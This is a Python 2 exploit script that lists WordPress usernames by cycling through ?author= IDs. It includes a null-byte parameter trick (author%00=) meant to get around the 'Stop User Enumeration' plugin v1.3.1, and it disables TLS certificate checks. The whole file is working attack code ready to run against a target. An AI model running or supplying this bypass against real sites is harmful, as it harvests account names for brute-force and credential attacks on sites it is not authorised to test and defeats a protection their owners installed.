#!/usr/bin/python

#Python script to perform WordPress user enumeration even if "Stop User Enumeration" plug-in is installed
#Tested on:
#Windows,Linux
#WordPress v4.2.2
#Stop User Enumeration v1.3.1

try:
	from bs4 import BeautifulSoup
	import urllib2
	import requests
	import sys
	import argparse
	import ssl
except Exception,e:
	print "[!] Error: "+str(e)
	print "[*] Make sure you have the following Python modules installed:\n\tbs4, urllib2, requests, argparse, ssl"
	exit(0)

parser = argparse.ArgumentParser(description="WordPress user enumeration even if 'Stop User Enumeration' plug-in is installed")
parser.add_argument('-t','--target', help='WordPress target', required=True)
parser.add_argument('-s','--start', help='Author start number value', required=True, type=int)
parser.add_argument('-e','--end', help='Author end number value', required=True, type=int)
parser.add_argument('-o','--outfile', help='Save output in file')
parser.add_argument('-v','--verbose', help='Show verbose message', action='store_const', const=True)
args = parser.parse_args()
target = args.target.encode('utf-8')
	
if target.endswith("/"):
	target = target[:-1]
	
if hasattr(ssl, '_create_unverified_context'):
	ssl._create_default_https_context = ssl._create_unverified_context

print "[*] Started"
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass
for i in range(int(args.start),int(args.end)+1):
	try:
		target_url = target+"/?author="+str(i)
		if args.verbose:
			print "[-] Trying: " + target_url
		r = requests.get(target_url, verify=False)
		sc = r.status_code
		if sc==500:
			target_url = target+"/?a=b&author%00="+str(i)
		if args.verbose:
			print "[-] Trying: " + target+"/?a=b&author%00="+str(i)
		r = requests.get(target_url, verify=False)
		sc = r.status_code
		if sc != 404 and sc != 500 and sc != 403:
			html = urllib2.urlopen(target_url)
			soup = BeautifulSoup(html.read(), "lxml")
			tag = soup.body
			uname = (tag['class'][2]).replace("author-","")
			#print str(i) + " : " + str(sc)
			print str(i) + " : " + str(uname)
			if args.outfile:
				f = open(args.outfile, "a")
				f.write(str(i) + " : " + str(uname) + "\n")
				f.close()
	except Exception,e:
		#print "Exception occurred"
		print str(e)
print "[*] Completed"
